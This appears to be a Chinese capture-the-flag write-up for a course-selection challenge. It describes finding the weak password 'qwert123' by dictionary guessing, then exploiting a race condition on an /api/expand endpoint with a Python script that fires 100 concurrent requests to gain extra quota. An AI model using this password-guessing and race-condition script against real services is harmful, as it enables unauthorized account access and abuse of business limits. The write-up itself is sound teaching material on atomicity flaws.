# Select More Courses

## 题目简述

本题延续选课系统场景，完整利用分为两步：先利用弱口令登录指定账号，再对拓展学分的接口发起并发请求，触发条件竞争，使账号获得足够的选课额度并选中目标课程。

## 解题过程

### 弱口令登录

题目提示了常见弱口令字典的思路。对登录接口做低频、定向的字典测试，可找到密码：

```text
qwert123
```

登录成功后保留当前会话，访问 `/expand`。页面上的 `race against time` 提示表明，此处不是继续寻找 SQL 注入或越权，而是检查同一业务操作的并发安全性。

### 并发调用拓展接口

`POST /api/expand` 接收的 JSON 为：

```json
{
  "username": "ma5hr00m"
}
```

将登录后的 Cookie 填入以下脚本，在一个有限的请求批次内并发调用接口：

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BASE_URL = "http://target.example"
COOKIE = "replace-with-your-session-cookie"


def expand_once():
    response = requests.post(
        f"{BASE_URL}/api/expand",
        headers={"Cookie": f"session={COOKIE}"},
        json={"username": "ma5hr00m"},
        timeout=5,
    )
    return response.status_code, response.text


with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(expand_once) for _ in range(100)]
    for future in as_completed(futures):
        status, body = future.result()
        print(status, body[:80])
```

多个请求在服务器检查状态与写回状态之间重叠，便可绕过本应串行执行的业务限制。返回选课页面确认可用额度已增加，然后选择要求更高额度的目标课程，即可获得 flag。

如果一批请求没有命中竞争窗口，应分批重试并调整并发度，不要使用无上限的死循环，否则容易将题目服务打挂，也不利于判断哪一批请求真正成功。

## 方法总结

- 题目把两个常见弱点串在一起：弱口令解决身份认证，条件竞争突破业务额度。
- 看到 `race`、秒杀、余额、次数或库存类提示时，应重点检查“检查—更新”是否具有原子性。
- 并发利用应使用有界线程池、超时和分批重试，保留状态码与响应摘要，方便验证成功条件。
